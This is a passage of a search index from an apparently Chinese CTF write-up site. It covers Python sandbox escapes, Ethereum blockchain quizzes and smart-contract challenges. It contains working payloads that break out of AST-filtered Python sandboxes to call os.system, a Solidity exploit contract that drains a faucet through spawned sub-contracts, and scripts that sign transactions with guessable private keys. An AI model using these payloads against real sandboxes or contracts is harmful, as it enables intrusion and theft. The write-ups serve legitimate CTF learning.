\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f\u7981\u6b62\u4e86\u5bfc\u5165\u548c\u5217\u8868\u63a8\u5bfc\uff0c\u6240\u4ee5\u76f4\u63a5\u901a\u8fc7\u7d22\u5f15\u627e\u5230 os._wrap_close \u5c31\u53ef\u4ee5\u4e86\uff1a</p> <ul> <li><code>().__class__.__bases__[0].__subclasses__()[127].close.__globals__[\"system\"](\"cat flag\")</code></li> </ul>"},{"location":"writeups/AAA/#pysandbox-12","title":"pysandbox 12","text":"<p>\u8fd9\u9898\u5361\u4e86\u6211\u5f88\u4e45\uff0c\u56e0\u4e3a ban \u4e86 Call\u3001Attribute\u3001Import \u57fa\u672c\u4e0a\u5c31\u76f8\u5f53\u4e8e\u4ec0\u4e48\u90fd\u5e72\u4e0d\u4e86\u4e86\u3002\u95ee\u4e86\u51fa\u9898\u4eba\uff0c\u544a\u8bc9\u6211\u662f py3 \u7684\u65b0\u529f\u80fd\uff0c\u6587\u6863\u5168\u90e8\u7ffb\u4e86\u597d\u51e0\u904d\u4e5f\u6ca1\u627e\u5230\u3002 \u76f4\u5230\u6211\u770b\u5230\u4e86\u8fd9\u7bc7\u6587\u7ae0\uff1ahttps://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c</p> <p>\u539f\u6765\u662f\u9898\u76ee\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\u6709\u6f0f\u6d1e\uff0c\u68c0\u67e5\u7684\u4e0d\u5b8c\u5168\uff0c\u6bd4\u5982\u8fd9\u9053\u9898\u76ee\u4e2d\u6709\uff1a <pre><code>def tisiv_Lambda(self, node):\n    self.tisiv(node.body)\n</code></pre> \u53ea\u68c0\u67e5\u4e86 node.body\uff0c\u800c\u4ece ast \u5b98\u65b9\u6587\u6863\u7684Abstract Grammar\u4e2d\u53ef\u4ee5\u770b\u5230\uff0cast.Lambda \u6709\u4e24\u4e2a\u5c5e\u6027\uff1a <pre><code>Lambda(arguments args, expr body)\n</code></pre> \u5176\u4e2d\u5e76\u6ca1\u6709\u68c0\u67e5 node.args \u4f46\u662f\u8fd9\u9898\u8c8c\u4f3c\u5e76\u6ca1\u6709\u7528\u5230\u8fd9\u4e2a\u6f0f\u6d1e</p> <p>\u4f46\u662f\u4eff\u7167\u8fd9\u7bc7 wp \u7684 payload\uff0c<code>[x for x in [_eval(\"1\")]]</code> \u7adf\u7136\u4e0d\u4f1a\u62a5\u9519 <pre><code>&gt;&gt;&gt; res = ast.parse('[x for x in [_eval(\"1\")]]')\n&gt;&gt;&gt; res.body\n[&lt;_ast.Expr object at ...&gt;]\n&gt;&gt;&gt; res.body[0].value\n&lt;_ast.ListComp object at ...&gt;\n&gt;&gt;&gt; res.body[0].value.generators\n[&lt;_ast.comprehension object at ...&gt;]\n</code></pre> \u901a\u8fc7 ast \u68c0\u67e5\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b83\u89e3\u6790\u5230\u4e86 ListComp\uff0c\u4f46\u5176\u63a8\u5bfc\u5668 ast.comprehension \u5e76\u6ca1\u6709\u5728\u9898\u76ee\u7684 Traversal \u7c7b\u4e2d\u51fa\u73b0\uff0c\u56e0\u6b64\u8fd9\u91cc\u7684 _eval \u4e5f\u5c31\u88ab\u5ffd\u7565\u4e86</p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u628a\u60f3\u8981\u8fd0\u884c\u7684\u4e1c\u897f\u585e\u5230 _eval \u91cc\u9762\u5c31\u597d\u4e86\uff1a</p> <ul> <li><code>[x for x in [_eval('().__class__.__bases__[0].__subclasses__()[127].close.__globals__[\"system\"](\"cat flag\")')]]</code></li> </ul>"},{"location":"writeups/AAA/#pysandbox-13","title":"pysandbox 13","text":"<p>\u6700\u540e\u4e00\u9898\u4e86\uff0c\u4ec5\u4ec5\u662f\u4fee\u590d\u4e86 12 \u9898\u7684\u6f0f\u6d1e\uff0c\u5e76\u4e14\u6ca1\u6709\u5f15\u5165\u65b0\u7684\u6f0f\u6d1e\uff0c\u770b\u8d77\u6765\u6709\u70b9\u9ebb</p> <p>\u5b83\u4e0d\u4ec5\u4fee\u590d\u4e86 tisiv_Lambda\uff0c\u800c\u4e14\u5728\u904d\u5386\u7684\u65f6\u5019\u68c0\u6d4b\u4e86\u5f53\u524d\u8282\u70b9\u5982\u679c\u4e0d\u5728\u7ed9\u51fa\u7684\u65b9\u6cd5\u4e2d\uff0c\u9664\u4e86 ast.expr \u4e4b\u5916\uff08\u5373\u5305\u62ec ast.comprehension\uff09\u90fd\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002\u6709\u4e9b\u96be\u641e \u800c\u4e14\u548c\u6587\u6863\u76f8\u6bd4\u8f83\uff0c\u6bcf\u4e2a\u8bed\u6cd5\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u68c0\u6d4b\u5230\u4e86</p> <p>\u4f46\u662f\u518d\u4e00\u5bf9\u6bd4\uff0c\u53d1\u73b0\u6709\u4e9b expr \u5728 Traversal \u7684\u65b9\u6cd5\u91cc\u4e5f\u6ca1\u6709\u51fa\u73b0\uff0c\u90a3\u5c31\u662f ast.FormattedValue\u3002 \u8fd9\u5176\u5b9e\u662fpython3.6\u4e2d\u65b0\u52a0\u7684 f-string \u7684\u5185\u5bb9 <pre><code>&gt;&gt;&gt; res = ast.parse(\"f'{x}'\")\n&gt;&gt;&gt; res\n&lt;_ast.Module object at ...&gt;\n&gt;&gt;&gt; res.body\n[&lt;_ast.Expr object at ...&gt;]\n&gt;&gt;&gt; res.body[0].value\n&lt;_ast.JoinedStr object at ...&gt;\n&gt;&gt;&gt; res.body[0].value.values\n[&lt;_ast.FormattedValue object at ...&gt;]\n</code></pre> \u4e25\u8c28\u6765\u8bf4\uff0cf-string \u5176\u5b9e\u662f ast.JoinedStr\uff0c\u8fd9\u4e2a\u5728 Traversal \u4e2d\u68c0\u6d4b\u8fc7\u4e86 \u800c ast.FormattedValue \u662f\u5176\u4e2d\u683c\u5f0f\u5316\u7684\u90e8\u5206\uff0c\u4e5f\u5c31\u662f<code>{}</code>\u4e2d\u7684\u90e8\u5206</p> <p>\u56e0\u6b64\uff0c\u628a\u60f3\u8981\u8fd0\u884c\u7684\u901a\u8fc7 _eval \u5199\u5728 f-string \u7684\u5927\u62ec\u53f7\u91cc\u9762\u5c31\u597d\u4e86\uff1a \uff08\u56e0\u4e3a eval \u91cc\u9762\u8981\u540c\u65f6\u51fa\u73b0\u547d\u4ee4\u7684\u5f15\u53f7\u548c\u547d\u4ee4\u4e2d\u7684\u5f15\u53f7\uff0c\u5916\u9762\u4e5f\u8981\u6709 f-string \u7684\u5f15\u53f7\u3002\u800c\u4e14 eval \u4e2d\u4e0d\u80fd\u7528\\\u8f6c\u4e49\u5f15\u53f7\uff0c\u6240\u4ee5\u8981\u7528\u5230\u4e09\u5f15\u53f7\u4f5c\u4e3a f-string \u7684\u5f15\u53f7\uff09</p> <ul> <li><code>f\"\"\"{_eval('().__class__.__bases__[0].__subclasses__()[127].close.__globals__[\"system\"](\"cat flag\")')}\"\"\"</code></li> </ul>"},{"location":"writeups/AAA/#blockchain-basics","title":"blockchain basics","text":"<p>\u4e0b\u8f7d\u597d\u865a\u62df\u673a\uff0c\u7136\u540e\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8fdb\u884c\uff0c\u6700\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag: AAA{97c8d39fc70b52208f18fc66bbf58874b}</p>"},{"location":"writeups/AAA/#blockchain-quiz1","title":"blockchain quiz1","text":"<p>\u7ed9\u4e86\u8d26\u6237 A \u7684\u516c\u79c1\u94a5\uff0c\u548c B \u7684\u516c\u94a5\uff08\u5730\u5740\uff09\uff0c\u8981\u6c42\u4ece\u5168\u65b0\u7684 A \u8d26\u6237\u53d1\u9001 0.5 \u4ee5\u592a\u5e01\u7ed9 B \u8d26\u6237\u7684\u4ea4\u6613\u7684 hash \u503c</p> <p>\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u79c1\u94fe\uff0c\u7136\u540e\u4ece\u79c1\u94a5\u521b\u5efa\u4e00\u4e2a A \u8d26\u6237\uff0c\u518d\u53d1\u9001\u4e00\u7b14\u4ea4\u6613\u5373\u53ef</p> <p>\u521b\u4e16\u533a\u5757\u914d\u7f6e\uff1a</p> genesis.json<pre><code>{\n  \"config\": {\n    \"chainId\": 1,  // \u5728\u4e3b\u94fe\u4e0a\uff0cchainId \u4e3a 1\n    \"homesteadBlock\": 0,\n    \"eip150Block\": 0,\n    \"eip155Block\": 0,\n    \"eip158Block\": 0,\n    \"byzantiumBlock\": 0,\n    \"constantinopleBlock\": 0,\n    \"petersburgBlock\": 0,\n    \"clique\": {\n      \"period\": 15,\n      \"epoch\": 30000\n    }\n  },\n  \"gasLimit\": \"21000\",  // \u9898\u76ee\u7ed9\u7684 gasLimit\n  \"difficulty\": \"1\",\n  \"extraData\": \"0x00000000000000000000000000000000000000000000000000000000000000006F8e244A412F728d5F38dE23f60A1c8c2e57fB2A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\n  \"alloc\": {\n    \"6F8e244A412F728d5F38dE23f60A1c8c2e57fB2A\": {\n      \"balance\": \"0x1000000000000000\"  // \u521d\u59cb Wei\n    }\n  }\n}\n</code></pre> <p>\u901a\u8fc7 geth \u76f4\u63a5\u8fdb\u884c\u64cd\u4f5c</p> <pre><code>$ geth account import --datadir data key.prv\nYour new account is locked with a password. Please give a password. Do not forget this password.\nPassword: 123456\nRepeat password: 123456\nAddress: {6f8e244a412f728d5f38de23f60a1c8c2e57fb2a}\n$ geth init --datadir data genesis.json\n$ geth --datadir data --networkid 1 console\n&gt; eth.accounts\n[\"0x6f8e244a412f728d5f38de23f60a1c8c2e57fb2a\"]\n&gt; web3.fromWei(eth.getBalance(eth.accounts[0]))\n1.152921504606846976\n&gt; personal.unlockAccount(\"0x6f8e244a412f728d5f38de23f60a1c8c2e57fb2a\", \"123456\")\ntrue\n&gt; personal.sendTransaction({from: \"0x6f8e244a412f728d5f38de23f60a1c8c2e57fb2a\", to: \"0xb3bc02f0b64ab21e34ad594ebc3f1418d6225b85\", value: web3.toWei(0.5, \"ether\")}, \"123456\")\n\"0x58ba4de9e40c331709954cb10ad80850bb44238944580216ac715d46002fae5f\"\n</code></pre> <p>\u6700\u540e\u5f97\u5230\u7684\u5c31\u662f hash\uff0c\u7136\u540e\u6839\u636e\u9898\u76ee\u8981\u6c42\u6c42\u5b83\u7684 md5\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\u9700\u8981\u5148 bytes.fromhex\uff1a</p> <pre><code>&gt;&gt;&gt; import hashlib\n&gt;&gt;&gt; hashlib.md5(bytes.fromhex(\"58ba4de9e40c331709954cb10ad80850bb44238944580216ac715d46002fae5f\")).hexdigest()\n'705d1a89f95282d6e3dd3f9bd6d74246'\n</code></pre> <p>flag: AAA{705d1a89f95282d6e3dd3f9bd6d74246}</p>"},{"location":"writeups/AAA/#blockchain-quiz2","title":"blockchain quiz2","text":"<p>\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u65b0\u8d26\u6237 A \u7684\u79c1\u94a5\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5408\u7ea6\u7684\u5b57\u8282\u7801\uff0c\u8981\u6c42\u4e24\u4e2a hash\uff1a</p> <ul> <li>\u4ece\u8d26\u6237 A \u90e8\u7f72\u8fd9\u4e2a\u5408\u7ea6\u7684\u4ea4\u6613\u7684 hash</li> <li>\u8d26\u6237 A \u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684\u4ea4\u6613\u7684 hash</li> </ul> <p>\u901a\u8fc7 geth \u5ba2\u6237\u7aef\u64cd\u4f5c\uff0c\u4f7f\u7528\u548c quiz1 \u7c7b\u4f3c\u7684\u521b\u4e16\u533a\u5757\u914d\u7f6e</p> <p>\u5bf9\u4e8e\u90e8\u7f72\u548c\u8c03\u7528\u5408\u7ea6\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 eth.sendTransaction \u6765\u5b8c\u6210\uff1a</p> <ul> <li>\u5982\u679c to \u4e3a null\uff0c\u5219\u8868\u793a\u521b\u5efa\u5408\u7ea6\uff0cdata \u4e3a\u5408\u7ea6\u5b57\u8282\u7801</li> <li>\u5982\u679c to \u4e3a\u4e00\u4e2a\u5408\u7ea6\u5730\u5740\uff0c\u5219\u8868\u793a\u8c03\u7528\u5408\u7ea6\uff0cdata \u4e3a\u4f20\u9012\u7684\u53c2\u6570<ul> <li>data \u7684\u524d\u56db\u4e2a\u5b57\u8282\u4e3a selector\uff0c\u7528\u6765\u5236\u5b9a\u8c03\u7528\u5408\u7ea6\u4e2d\u54ea\u4e00\u4e2a\u51fd\u6570</li> <li>data \u540e\u9762\u90e8\u5206\u4e3a\u4f20\u9012\u53c2\u6570\u7684\u5341\u516d\u8fdb\u5236\uff0c\u6ca1\u6709\u53ef\u4ee5\u7a7a\u4e0b</li> </ul> </li> </ul> <p>\u6240\u4ee5\u9700\u8981\u627e\u7684\u5c31\u662f\u8fd9\u4e2a\u5408\u7ea6\u4e2d\u7684 selector \u4e86</p> <p>\u901a\u8fc7 https://ethervm.io/decompile \u9006\u4e00\u4e0b\u5408\u7ea6\u5b57\u8282\u7801\uff0c\u53bb\u6389\u524d\u9762\u7684\u7b2c\u4e00\u4e2a 6080...\uff08\u90e8\u7f72\u5b57\u8282\u7801\uff09\uff0c\u5269\u4e0b\u7684\u5b57\u8282\u7801\u9006\u51fa\u6765\u7684\u7ed3\u679c\u7b80\u5316\u4e00\u4e0b\uff1a <pre><code>contract Contract {\n    function main() {\n        memory[0x40:0x60] = 0x80;\n        var var0 = msg.value;\n\n        if (var0) { revert(memory[0x00:0x00]); }\n\n        if (msg.data.length &lt; 0x04) { revert(memory[0x00:0x00]); }\n\n        var0 = msg.data[0x00:0x20] &gt;&gt; 0xe0;\n\n        if (var0 != 0x6d4ce63c) { revert(memory[0x00:0x00]); }\n\n        var temp0 = memory[0x40:0x60];\n        memory[0x40:0x60] = temp0 + 0x40;\n        memory[temp0:temp0 + 0x20] = 0x0b;\n        memory[temp0 + 0x20:temp0 + 0x20 + 0x20] = 0x12195b1b1bc815dbdc9b19 &lt;&lt; 0xaa;\n        var var1 = 0x58;\n        var var3 = memory[0x40:0x60];\n        var var2 = temp0;\n        var1 = func_0061(var2, var3);\n        var temp1 = memory[0x40:0x60];\n        return memory[temp1:temp1 + var1 - temp1];\n    }\n\n    function func_0061(var arg0, var arg1) returns (var r0) {\n        var var0 = 0x00;\n        var var1 = 0x20;\n        ...\n    }\n}\n</code></pre> \u4ece\u8fd9\u91cc main \u51fd\u6570\u7684\u903b\u8f91\u53ef\u4ee5\u770b\u51fa\u6765\uff1a</p> <ul> <li>value \u9700\u8981\u4e3a 0</li> <li>data \u7684\u957f\u5ea6\u81f3\u5c11\u4e3a 4</li> <li>data \u7684\u5f00\u5934\u56db\u4e2a\u5b57\u8282\u8981\u4e3a 6d4ce63c</li> </ul> <p>\u6240\u4ee5 6d4ce63c \u5c31\u662f\u8981\u627e\u7684 selector\uff0c\u5373\u9700\u8981\u7684 data \u503c</p> <p>\u7136\u540e\u901a\u8fc7 geth \u64cd\u4f5c\u5c31\u597d\u4e86\uff08\u9700\u8981\u5236\u5b9a\u4e00\u4e0b\u4e24\u4e2a\u4ea4\u6613\u7684 gas \u4e3a\u9898\u76ee\u6307\u5b9a\u7684 200000\uff09\uff1a <pre><code>&gt; A = eth.accounts[0]\n\"0x6f8e244a412f728d5f38de23f60a1c8c2e57fb2a\"\n&gt; code = \"0x6080...\"\n&gt; personal.unlockAccount(A, \"123456\")\ntrue\n&gt; eth.sendTransaction({from: A, data: code, gas: 200000})\n\"0x91631092c8bba1276724f70b72dfcf85fa0664cb8db1706b030c3bec2b62e6b4\"\n&gt; miner.start(4); admin.sleepBlocks(1); miner.stop()\nnull\n&gt; eth.getTransactionReceipt(\"0x91631092c8bba1276724f70b72dfcf85fa0664cb8db1706b030c3bec2b62e6b4\")\n{\n  ...\n  contractAddress: \"0xc47b42aa60368b10915d657ce0298584c0f189c8\",\n  ...\n}\n&gt; contract_addr = \"0xc47b42aa60368b10915d657ce0298584c0f189c8\"\n\"0xc47b42aa60368b10915d657ce0298584c0f189c8\"\n&gt; eth.sendTransaction({from: A, to: contract_addr, data: \"0x6d4ce63c\", gas: 200000})\n\"0xeef1a18390372054179f3c30c73fae890dad9c61d97766540d98a7bd57942118\"\n</code></pre></p> <p>\u8fd9\u4e5f\u5c31\u62ff\u5230\u4e86\u4e24\u4e2a\u9700\u8981\u7684 hash\uff1a</p> <ul> <li>hash1: <code>0x91631092c8bba1276724f70b72dfcf85fa0664cb8db1706b030c3bec2b62e6b4</code></li> <li>hash2: <code>0xeef1a18390372054179f3c30c73fae890dad9c61d97766540d98a7bd57942118</code></li> </ul> <p>\u6309\u7167\u9898\u76ee\u8981\u6c42\u6c42 md5: <pre><code>&gt;&gt;&gt; hashlib.md5(bytes.fromhex(\"91631092c8bba1276724f70b72dfcf85fa0664cb8db1706b030c3bec2b62e6b4eef1a18390372054179f3c30c73fae890dad9c61d97766540d98a7bd57942118\")).hexdigest()\n'0b0d92f3554b3f15f69e372a1fd3866f'\n</code></pre> flag: AAA{0b0d92f3554b3f15f69e372a1fd3866f}</p>"},{"location":"writeups/AAA/#hard-gambler","title":"hard gambler","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity ^0.4.24;\n\nimport \"BasicToken.sol\";\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/e79dc645e4d3ad5618317f264df329f4a0f36e94/contracts/token/ERC20/BasicToken.sol\n\ncontract hardgambler is BasicToken {\n    uint nonce;\n    uint cost;\n    uint lasttime;\n\n    mapping (address=&gt;uint) logger;\n\n    event SendFlag (address);\n\n    constructor() public {\n        nonce = 0;\n        cost  = 10;\n        lasttime = now;\n    }\n\n    function profit() public {\n        require(logger[msg.sender] == 0);\n        logger[msg.sender] = 1;\n        balances[msg.sender] += 20;\n        lasttime = now;\n    }\n\n    function bet(uint value, uint mod) public {\n        address _addr = msg.sender;\n        // make sure\n        require(lasttime != now);\n        require(mod &gt;= 2 &amp;&amp; mod &lt;= 10);\n        require(logger[msg.sender] &lt;= 10);\n        logger[msg.sender] += 1;\n\n        require(balances[msg.sender] &gt;= cost);\n        balances[msg.sender] -= cost;\n\n        // limit \n        value = value % mod;\n\n        // not contract \n        uint32 size;\n        assembly {\n            size := extcodesize(_addr)\n        }\n        require(size == 0);\n\n        // rnd gen\n        uint rand = uint(keccak256(abi.encodePacked(\n            nonce, \n            now,\n            block.difficulty,\n            msg.sender\n        ))) % mod;\n        nonce += 1;\n        lasttime = now;\n\n        if (rand == value) {\n            balances[msg.sender] += (cost * mod);\n        }\n    }\n\n    function getFlag() public {\n        require(balances[msg.sender] &gt;= 500);\n        balances[msg.sender] = 0;\n        emit SendFlag(msg.sender);\n        selfdestruct(msg.sender);\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u4f7f\u67d0\u4e00\u4e2a\u8d26\u6237\u4e0a\u7684 balances \u4e0d\u5c11\u4e8e 500</p> <p>\u770b\u8d77\u6765 bet \u51fd\u6570\u5f88\u590d\u6742\u3001\u9650\u5236\u4e5f\u5f88\u591a\u3002\u4f46\u662f profit \u51fd\u6570\u662f\u4e00\u4e2a\u7a7a\u6295\u51fd\u6570\uff0c\u800c\u4e14 BasicToken \u4e2d\u4e5f\u63d0\u4f9b\u4e86 transfer \u51fd\u6570\uff0c\u6240\u4ee5\u76f4\u63a5\u65b0\u5efa\u4e00\u5806\u5408\u7ea6\u8d26\u6237\u8585\u7f8a\u6bdb\u5c31\u53ef\u4ee5\u4e86</p> exp <pre><code>pragma solidity ^0.4.24;\n\n/* code of hardgambler */\n\ncontract Exploit {\n    hardgambler challenge;\n    constructor(address addr) public {\n        challenge = hardgambler(addr);\n    }\n    function exp(int num) public {\n        for (int i = 0; i &lt; num; i++) {\n            new Middleware(address(challenge), this);\n        }\n    }\n    function getFlag() public {\n        challenge.getFlag();\n    }\n}\n\ncontract Middleware {\n    constructor(address challenge, address addr) public {\n        hardgambler target = hardgambler(challenge);\n        target.profit();\n        target.transfer(addr, 20);\n    }\n}\n</code></pre> <p>\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8c03\u7528 exp(25)\uff0c\u7136\u540e\u8c03\u7528 getFlag\uff0c\u518d\u628a token \u548c transaction hash \u53d1\u7ed9\u670d\u52a1\u5668\u5c31\u80fd\u62ff\u5230 flag: ACTF{7h3R3_4h0uLd_bE_7wO_Pr2cT1CAl_5oLuT10N_FOR_7HIs_Ch4lLENge}</p>"},{"location":"writeups/AAA/#money","title":"money","text":"pow <pre><code>from pwn import *\nimport itertools\n\np = remote(\"10.214.160.13\", 20000)\np.recvuntil(b\"(\")\nprefix = p.recvuntil(b\" +\")[:-2]\nprint(prefix.decode())\n\ndef is_valid(digest):\n    bits = \"\".join(bin(i)[2:].zfill(8) for i in digest)\n    return bits.endswith(\"0000\")\n\ndef pow():\n    if is_valid(hashlib.sha256(prefix).digest()):\n        p.sendlineafter(b\" = \", b\"\")\n        return \n    for i in range(5):\n        for comb in itertools.product(string.ascii_letters+string.digits, repeat=i):\n            m = ''.join(comb)\n            if is_valid(hashlib.sha256(prefix + m.encode()).digest()):\n                print(m)\n                p.sendlineafter(b\" = \", m.encode())\n                return\n\npow()\np.interactive()\n</code></pre> <p>\u4e00\u6761\u79c1\u94fe\uff0c\u6ca1\u6709\u5408\u7ea6\uff0c\u6ca1\u6709 faucet\uff0c\u8fd8\u4f1a\u9650\u5236 rpc\uff0c\u9700\u8981\u5f97\u5230\u4e00\u4e2a\u4f59\u989d\u4e0d\u5c0f\u4e8e 10 ether \u7684\u5730\u5740</p> <p>\u901a\u8fc7\u4e0d\u8f93\u5165\u5730\u5740\u89c2\u5bdf\u62a5\u9519\u53ef\u4ee5\u53d1\u73b0\u4f7f\u7528\u4e86 eth-challenge-base\uff0c\u6240\u4ee5\u5269\u4f59\u7684 method \u4e5f\u5c31\u53ea\u6709\uff1a <pre><code>var whitelist = [\n    \"eth_blockNumber\",\n    \"eth_call\",\n    \"eth_chainId\",\n    \"eth_estimateGas\",\n    \"eth_gasPrice\",\n    \"eth_getBalance\",\n    \"eth_getCode\",\n    \"eth_getStorageAt\",\n    \"eth_getTransactionByHash\",\n    \"eth_getTransactionCount\",\n    \"eth_getTransactionReceipt\",\n    \"eth_sendRawTransaction\",\n    \"net_version\",\n    \"rpc_modules\",\n    \"web3_clientVersion\"\n];\n</code></pre></p> <p>\u95ee\u56db\u8001\u5e08\u5f97\u5230\u7684 hint \u662f Steal a poor guy's key and win your money</p> <p>\u7ffb\u4e86\u5f88\u591a\u6e90\u7801\uff0c\u770b\u4e0d\u51fa\u6cc4\u6f0f\u7684\u5730\u65b9</p> <p>\u540e\u6765\u5c1d\u8bd5\u4e86\u4e00\u4e0b http://www.privatekeys.info/ethereum/1 \u5c0f\u79c1\u94a5\uff0c\u5199\u811a\u672c\u8dd1\u4e86\u4e0b\u53d1\u73b0\u79c1\u94a5\u662f 3 \u7684\u8d26\u6237\u6709\u5927\u91cf\u4f59\u989d\uff1a <pre><code>&gt; eth.getBalance(\"0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69\")\n9.04625697166532776746648320380374280103671755200316906558262375061821325312e+74\n</code></pre> \u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u77ff\u5de5\u8d26\u53f7\uff0c\u4f46\u662f\u76f4\u63a5\u4ea4\u8fd9\u4e2a\u5730\u5740\u4e0d\u884c\uff0c\u5e94\u8be5\u662f\u5224\u65ad\u4e86\u662f\u5426\u4e3a\u77ff\u5de5\uff0c\u6240\u4ee5\u8f6c\u51fa\u4e00\u4e0b\u5c31\u597d\u4e86\uff1a <pre><code>from web3 import Web3\n\nw3 = Web3(Web3.HTTPProvider('http://10.214.160.13:18545'))\n\ntoAddress = '...'\nfromAddress = '0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69'\nprivateKey = '0000000000000000000000000000000000000000000000000000000000000003'\n\ndef get_txn(src, dst, value=0, gas=0x200000):\n    return {\n        \"chainId\": 0x22b8,   # eth.chainId() \u5f97\u5230\u7684\n        \"from\": src,\n        \"to\": dst,\n        \"gasPrice\": w3.toWei(1.1, 'gwei'),\n        \"gas\": gas,\n        \"value\": w3.toWei(value, 'ether'),\n        \"nonce\": w3.eth.getTransactionCount(src),\n    }\n\nss = get_txn(fromAddress, toAddress, 10)\ntxn_hash = w3.eth.sendRawTransaction(w3.eth.account.signTransaction(ss, privateKey).rawTransaction).hex()\ntxn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\nprint(txn_receipt)\n</code></pre></p> <p>\u4e4b\u540e\u95ee\u4e86\u56db\u8001\u5e08\u7684\u505a\u6cd5\uff0c\u4ed6\u662f\u7528\u5269\u4f59 method \u6765 leak \u51fa\u4e86\u77ff\u5de5\u8d26\u53f7</p> <p>eth.call \u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u6ca1\u6709\u5408\u7ea6\u53ef\u4ee5\u8c03\u7528\uff0c\u6240\u4ee5\u5b83\u76ee\u524d\u53ea\u53ef\u4ee5\u521b\u5efa\u5408\u7ea6\uff0c\u800c\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u5019 EVM \u4f1a\u5148\u8fd0\u884c creationCode\uff0c\u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u4efb\u4f55 EVM \u6307\u4ee4\uff0c\u4e5f\u53ef\u4ee5\u8fd4\u56de\u5230\u56de\u663e\uff0c\u5e76\u4e14\u751a\u81f3\u4e0d\u9700\u8981 gas\uff0c\u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\u76f4\u63a5\u8fd4\u56de coinbase\uff1a <pre><code>COINBASE    ; \u5c06 coinbase \u538b\u5165\u6808\nPUSH1 0x80  ; \u7ed9 mstore \u7684 offset\nMSTORE      ; \u5c06 coinbase \u4ece\u6808\u4e2d\u53d6\u51fa\u5b58\u5165 memory[offset:offset+0x20]\nPUSH1 0x20  ; \u7ed9 return \u7684 length\nPUSH1 0x80  ; \u7ed9 return \u7684 offset\nRETURN      ; \u8fd4\u56de memory[offset:offset+0x20]\n</code></pre> \u6240\u4ee5\u5b57\u8282\u7801\u5c31\u662f 4160805260206080f3 <pre><code>&gt; eth.call({to:null, data:\"0x4160805260206080f3\"})\n\"0x0000000000000000000000006813eb9362372eef6200f3b1dbc3f819671cba69\"\n</code></pre> \u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u77ff\u5de5\u5730\u5740\uff0c\u7136\u540e\u641c\u7d22\u53ef\u4ee5\u67e5\u5230\u79c1\u94a5\u662f 3</p>"},{"location":"writeups/SecurityInnovation/","title":"Security Innovation Smart Contract CTF Writeups","text":"<p> \u7ea6 2051 \u4e2a\u5b57  852 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 17 \u5206\u949f</p> <p>Abstract</p> <p>https://blockchain-ctf.securityinnovation.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55</p> <p>\u524d\u7f6e\u6b65\u9aa4\uff1a</p> <ul> <li>\u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237</li> <li>\u8fde\u63a5\u5230 Ropsten \u6d4b\u8bd5\u7f51\u7edc</li> <li>\u901a\u8fc7 https://faucet.metamask.io/ \u641e\u70b9\u6d4b\u8bd5\u5e01</li> <li>\u5728\u7f51\u7ad9\u4e0a\u8fde\u63a5 MetaMask\u3001\u90e8\u7f72\u9898\u76ee</li> </ul>"},{"location":"writeups/SecurityInnovation/#donation","title":"Donation","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Donation is CtfFramework{\n    using SafeMath for uint256;\n\n    uint256 public funds;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        funds = funds.add(msg.value);\n    }\n\n    function() external payable ctf{\n        funds = funds.add(msg.value);\n    }\n\n    function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf{\n        msg.sender.transfer(funds);\n        funds = 0;\n    }\n</code></pre> <p>\u76ee\u7684\u662f\u628a\u5408\u7ea6\u8d26\u6237\u641e\u6ca1\u94b1\uff0c\u6240\u4ee5\u5728 Remix \u4e2d\u7f16\u8bd1\u4e0b\u4ee3\u7801\uff0c\u7136\u540e\u4ece\u9898\u76ee\u90e8\u7f72\u7684\u5408\u7ea6\u5730\u5740\u8f7d\u5165\u5408\u7ea6\uff0c\u518d\u8c03\u7528 withdrawDonationsFromTheSuckersWhoFellForIt \u51fd\u6570\u5373\u53ef</p>"},{"location":"writeups/SecurityInnovation/#lock-box","title":"Lock Box","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Lockbox1 is CtfFramework{\n    uint256 private pin;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, 